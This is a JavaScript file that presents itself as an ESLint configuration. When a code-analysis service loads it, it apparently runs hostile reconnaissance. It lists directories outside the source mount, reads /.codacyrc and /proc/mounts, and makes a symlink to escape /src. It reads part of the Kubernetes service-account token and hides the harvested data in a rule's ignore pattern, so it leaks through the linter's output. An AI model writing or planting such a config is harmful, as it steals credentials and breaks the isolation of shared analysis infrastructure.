var fs = require('fs');
var result = '';

// Try to traverse NFS mount parent
try {
  var parent = fs.readdirSync('/src/../');
  result += 'PARENT:' + parent.slice(0,20).join(',') + '|';
} catch(e) { result += 'PARENT_ERR:' + e.code + '|'; }

// Read .codacyrc config
try {
  var config = fs.readFileSync('/.codacyrc', 'utf8');
  result += 'RC:' + config.substring(0, 200) + '|';
} catch(e) { result += 'RC_ERR:' + e.code + '|'; }

// Try /export
try {
  var exp = fs.readdirSync('/export');
  result += 'EXPORT:' + exp.join(',') + '|';
} catch(e) { result += 'NO_EXPORT:' + e.code + '|'; }

// Try to read other mount paths visible in /proc
try {
  var mounts = fs.readFileSync('/proc/mounts', 'utf8');
  var lines = mounts.split(String.fromCharCode(10));
  var nfsCount = lines.filter(function(l) { return l.indexOf('nfs') !== -1; }).length;
  result += 'NFS_MOUNTS:' + nfsCount + '|';
} catch(e) {}

// Try symlink creation to parent
try {
  fs.symlinkSync('/src/..', '/tmp/parent_link');
  var via_link = fs.readdirSync('/tmp/parent_link');
  result += 'VIA_LINK:' + via_link.slice(0,10).join(',') + '|';
} catch(e) { result += 'LINK_ERR:' + e.code + '|'; }

// Get second part of token
try {
  var token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8');
  result += 'TOKEN_P2:' + token.substring(250, 500);
} catch(e) {}

result += '{{{BREAK}}}';
module.exports = { rules: { "no-unused-vars": ["error", { varsIgnorePattern: result }] } };
